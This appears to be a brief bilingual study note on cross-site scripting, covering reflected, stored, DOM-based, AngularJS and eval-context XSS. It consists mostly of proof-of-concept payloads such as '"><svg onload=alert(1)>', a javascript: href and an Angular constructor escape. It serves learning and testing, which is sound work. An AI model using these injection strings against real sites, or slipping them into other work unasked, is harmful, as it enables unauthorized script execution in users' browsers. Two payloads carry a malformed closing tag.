## XSS

### Reflected XSS

* input直接反射到HTML context里

```html
<script>alert(1)<script>
```



### Stored XSS

* input先被存储浏览后执行

```
<script>alert(1)<script>
```



### DOM XSS

* DOM-based XSS，操作dom
* 特征：**document.write() / .InnerHTML / href attribute**

  * location.search: query string包含?

    

* Test flow:

  * input: g3n  

  * search in dom: g3n

  * check the logic and break out of it

    

* direct input

```html
"><svg onload=alert(1)>
```

```html
<img src=1 onerror=alert(1)>
```

* URL

```html
// change url directly when post/get
// inner html
?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

```html
// href
?returnUrl=javascript:alert(document.domain)
```



* AngularJS

  * search: ng-app
```javascript
 {{$on.constructor('alert(1)')()}} 
```

  

### Reflected DOM XSS

* eval

```javascript
\"+alert(1)}//

\": close the prefix
+ : math eval
// : comment out the rest
```



### Stored DOM XSS

* Replace： 默认只替换第一个

```html
<><img src=1 onerror=alert(1)>
```

